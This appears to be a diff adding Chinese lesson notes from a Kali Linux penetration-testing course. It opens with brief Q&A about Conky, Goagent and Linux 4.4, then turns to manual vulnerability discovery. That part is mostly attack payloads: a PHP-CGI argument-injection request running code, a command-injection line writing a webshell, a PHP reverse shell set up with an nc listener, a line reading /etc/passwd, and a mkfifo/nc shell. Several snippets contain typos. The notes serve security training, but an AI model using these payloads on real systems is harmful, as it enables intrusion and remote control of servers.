@@ -1,0 +1,75 @@
+课时84 答疑（Conky、Goagent、Linux4.4内核发布）,手动漏洞挖掘
+
+问答
+Conky
+    https://weather.yahoo.com/
+    conkyrc
+        beijing: 2151330
+Goagent
+    不要启动多次
+    Win+M
+
+Linux 4.4内核发布，在虚拟机中可使用主机上的GPU
+
+root@kali:~# vi .conkyrc
+${execi 300 curl -s "http://weather.yahoapis.com/forecastrss?w=2151330=c" -o ~/.cache/weather.xml}
+
+打开goagent后，然后关闭终端，goagent关闭后在后台运行，再运行goagent会出现报错信息
+
+win+M
+
+按agent退出
+
+手动漏洞挖掘
+默认安装
+    Windows默认安装漏洞
+    phpMyAdmin/setup
+    Ubuntu / Debian默认安装PHP5-cgi
+    可直接访问 /cgi-bin/php5和/cgi-bin/php(爬不出来的目录)
+POST http://192.168.20.10/phpMyAdmin/?-d+allow_url_include%3d+-
+d+auto_prepend_file%3dphp://input HTTP/1.1
+Host:192.168.20.10
+<?php
+passthru("id");
+die();
+?>
+
+root@kali:~# cd /opt/
+
+root@kali:~/opt# cd burppor16/
+
+root@kali:~/opt/burppor16# ./burp.sh
+
+手动漏洞挖掘
+PHP反弹shell
+    /usr/share/webshells/php/php-reverse-shell.php
+File
+Whereis
+    Ifconfig
+
+写入webshell
+    ;echo "<?php \$cmd=\$_GET["cmd"];system[\$cmd];?>" > var/www/3.php
+
+root@kali:~# cp /usr/share/webshell/php/
+findsock.c               php-findsock-shell.php  qsd-php-backdoor.php
+php-backdoor.php         php-reverse-shell.php   simple-backdoor.php
+
+root@kali:~# cp /usr/share/webshells/php/php-reverse-shell.php ./3.php
+
+root@kali:~# ls
+3.php  ????  公共  模板  视频  图片  文档  下载  音乐  桌面
+
+root@kali:~# vi 3.php
+$ ip = '192.168.1.106';
+
+root@kali:~#  nc -nvvlp 1234
+
+
+<?php
+echo system('cat /etc/psswd');
+?>
+
+<?php
+system('mkfifo /temp/pipe;sh /tmp/pipe | nc -nlp 4444 > /tmp/pipe');
+?>
+
